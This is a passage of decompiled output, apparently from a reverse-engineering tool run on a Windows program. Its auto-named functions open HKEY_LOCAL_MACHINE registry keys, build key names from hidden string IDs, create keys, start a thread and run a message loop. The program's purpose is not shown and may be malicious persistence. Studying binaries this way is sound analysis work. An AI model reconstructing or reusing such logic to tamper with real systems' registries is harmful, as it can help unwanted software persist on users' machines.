  }
  *in_FS_OFFSET = uStack_10;
  return;
}



void FUN_00408540(void)

{
  uint uVar1;
  undefined4 uVar2;
  undefined4 *in_FS_OFFSET;
  int *piVar3;
  undefined4 *puVar4;
  undefined **ppuVar5;
  undefined4 uStack_28;
  undefined *puStack_24;
  undefined *puStack_20;
  undefined *local_1c;
  undefined4 *local_18;
  undefined4 *local_14;
  undefined4 *local_10;
  int local_c;
  undefined *local_8;
  
  puStack_20 = &stack0xfffffffc;
  local_8 = (undefined *)0x0;
  local_c = 0;
  local_10 = (undefined4 *)0x0;
  local_14 = (undefined4 *)0x0;
  local_18 = (undefined4 *)0x0;
  local_1c = (undefined *)0x0;
  puStack_24 = &LAB_00408630;
  uStack_28 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_28;
  FUN_004043c8(*(int *)PTR_DAT_0040a6f4,(HKEY)0x80000002);
  FUN_00404b48(0x2f,&local_c);
  piVar3 = &local_c;
  FUN_00404b48(0x23,(int *)&local_10);
  FUN_00402934(piVar3,local_10);
  FUN_004043f4(*(int *)PTR_DAT_0040a6f4,local_c,'\x01');
  FUN_004049cc((int *)&local_14);
  puVar4 = local_14;
  FUN_00406508((int *)&local_18);
  FUN_00402978((int *)&local_8,local_18,puVar4);
  ppuVar5 = &local_1c;
  uVar1 = FUN_00404bac(PTR_DAT_0040a6bc,0x79a);
  uVar2 = FUN_00403a28(uVar1 & 0xffff);
  FUN_00404b78((short)uVar2 + 1,PTR_DAT_0040a6bc,0x79a,(int *)ppuVar5);
  FUN_00404694(*(int *)PTR_DAT_0040a6f4,local_1c,local_8);
  FUN_004043a8(*(int *)PTR_DAT_0040a6f4);
  FUN_00404bf4(-1,local_8);
  *in_FS_OFFSET = uStack_28;
  puStack_20 = &LAB_00408637;
  puStack_24 = (undefined *)0x40862f;
  FUN_004026b0((int *)&local_1c,6);
  return;
}



void FUN_0040863c(int *param_1)

{
  char cVar1;
  int *piVar2;
  uint uVar3;
  char *pcVar4;
  undefined4 uVar5;
  ushort uVar6;
  char *unaff_EBX;
  char *unaff_ESI;
  uint uVar7;
  int unaff_EDI;
  undefined4 *in_FS_OFFSET;
  int *piVar8;
  undefined *local_28;
  undefined *local_24;
  undefined4 *local_20;
  int local_10;
  short local_c;
  ushort local_a;
  int *local_8;
  
  local_20 = (undefined4 *)&stack0xfffffffc;
  local_10 = 4;
  do {
    local_10 = local_10 + -1;
  } while (local_10 != 0);
  local_24 = &LAB_00408816;
  local_28 = (undefined *)*in_FS_OFFSET;
  *in_FS_OFFSET = &local_28;
  local_8 = param_1;
  piVar2 = FUN_00403ca8((int *)&DAT_00403c8c,'\x01',0);
  FUN_004043c8(*(int *)PTR_DAT_0040a6f4,(HKEY)0x80000002);
  FUN_00404b48(0x27,&local_10);
  FUN_004043f4(*(int *)PTR_DAT_0040a6f4,local_10,'\0');
  FUN_0040452c(*(int *)PTR_DAT_0040a6f4,(int)piVar2);
  local_c = *(short *)(piVar2 + 2);
  uVar7 = 0;
  do {
    uVar3 = FUN_00404bac(PTR_DAT_0040a6bc,0x79a);
    if ((short)uVar3 != 0) {
      local_a = 1;
      do {
        FUN_00404b78(local_a,PTR_DAT_0040a6bc,0x79a,(int *)&stack0xffffffec);
        pcVar4 = unaff_EBX;
        FUN_00403d64((int)piVar2,uVar7 & 0xffff,(int *)&stack0xffffffe8);
        pcVar4 = FUN_00402c64(unaff_ESI,pcVar4);
        if (pcVar4 == (char *)0x1) {
          FUN_00404b48(0x2e,(int *)&stack0xffffffe4);
          piVar8 = (int *)&stack0xffffffe4;
          FUN_00403d64((int)piVar2,uVar7 & 0xffff,(int *)&local_20);
          FUN_00402934(piVar8,local_20);
          FUN_004043f4(*(int *)PTR_DAT_0040a6f4,unaff_EDI,'\0');
          FUN_00404b48(0x26,(int *)&local_24);
          cVar1 = FUN_00404728(*(int *)PTR_DAT_0040a6f4,local_24);
          if (cVar1 != '\0') {
            FUN_00404b48(0x25,(int *)&local_28);
            cVar1 = FUN_00404728(*(int *)PTR_DAT_0040a6f4,local_28);
            if (cVar1 != '\0') {
              FUN_00403d64((int)piVar2,uVar7 & 0xffff,local_8);
              break;
            }
          }
        }
        local_a = local_a + 1;
        uVar6 = (short)uVar3 - 1;
        uVar3 = (uint)uVar6;
      } while (uVar6 != 0);
    }
    uVar7 = uVar7 + 1;
    local_c = local_c + -1;
    if (local_c == 0) {
      if (*local_8 == 0) {
        piVar8 = local_8;
        uVar7 = FUN_00404bac(PTR_DAT_0040a6bc,0x79a);
        uVar5 = FUN_00403a28(uVar7 & 0xffff);
        FUN_00404b78((short)uVar5 + 1,PTR_DAT_0040a6bc,0x79a,piVar8);
      }
      FUN_00401e98(piVar2);
      FUN_004043a8(*(int *)PTR_DAT_0040a6f4);
      *in_FS_OFFSET = local_28;
      local_20 = (undefined4 *)&LAB_0040881d;
      local_24 = (undefined *)0x408815;
      FUN_004026b0((int *)&local_28,7);
      return;
    }
  } while( true );
}



void FUN_00408824(void)

{
  char cVar1;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_1c;
  undefined *puStack_18;
  undefined *puStack_14;
  undefined4 *local_c;
  int local_8;
  
  puStack_14 = &stack0xfffffffc;
  local_8 = 0;
  local_c = (undefined4 *)0x0;
  puStack_18 = &LAB_004088bb;
  uStack_1c = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_1c;
  FUN_004043c8(*(int *)PTR_DAT_0040a6f4,(HKEY)0x80000002);
  FUN_00404b48(0x2e,(int *)&local_c);
  FUN_00402978(&local_8,local_c,DAT_0040ce04);
  cVar1 = FUN_004043f4(*(int *)PTR_DAT_0040a6f4,local_8,'\0');
  if (cVar1 != '\x01') {
    FUN_004043f4(*(int *)PTR_DAT_0040a6f4,local_8,'\x01');
  }
  FUN_004043a8(*(int *)PTR_DAT_0040a6f4);
  *in_FS_OFFSET = uStack_1c;
  puStack_14 = &LAB_004088c2;
  puStack_18 = (undefined *)0x4088ba;
  FUN_004026b0((int *)&local_c,2);
  return;
}



void entry(void)

{
  int *piVar1;
  int iVar2;
  BOOL BVar3;
  undefined4 extraout_ECX;
  DWORD extraout_ECX_00;
  DWORD extraout_ECX_01;
  DWORD DVar4;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 uVar5;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_28;
  undefined *puStack_24;
  undefined *puStack_20;
  undefined4 *local_18 [5];
  
  local_18[0] = (undefined4 *)0x0;
  puStack_20 = (undefined *)0x408a82;
  FUN_004035e4(&DAT_0040899c);
  puStack_24 = &LAB_00408b35;
  uStack_28 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_28;
  puStack_20 = &stack0xfffffffc;
  FUN_00403660();
  FUN_00404d3c();
  FUN_00404778();
  FUN_00403a04();
  piVar1 = FUN_00404368((int *)&LAB_00404330,'\x01',extraout_ECX);
  *(int **)PTR_DAT_0040a6f4 = piVar1;
  FUN_0040863c((int *)local_18);
  FUN_004026e0(&DAT_0040ce04,local_18[0]);
  iVar2 = FUN_00408824();
  DVar4 = extraout_ECX_00;
  uVar5 = extraout_EDX;
  if (iVar2 != 0) {
    DAT_0040ce08 = FUN_00402648((LPSECURITY_ATTRIBUTES)0x0,0,&LAB_004088cc,(LPDWORD)PTR_DAT_0040a6e0
                                ,0,0);
    iVar2 = FUN_00408540();
    DVar4 = extraout_ECX_01;
    uVar5 = extraout_EDX_00;
  }
  FUN_00406470(iVar2,uVar5,DVar4);
  FUN_00408498();
  while( true ) {
    BVar3 = GetMessageA((LPMSG)&DAT_0040cde8,(HWND)0x0,0,0);
    if (BVar3 == 0) break;
    DispatchMessageA((MSG *)&DAT_0040cde8);
  }
  *in_FS_OFFSET = uStack_28;
  puStack_20 = &DAT_00408b3c;
  puStack_24 = (undefined *)0x408b34;
  FUN_0040268c((int *)local_18);
  return;
}


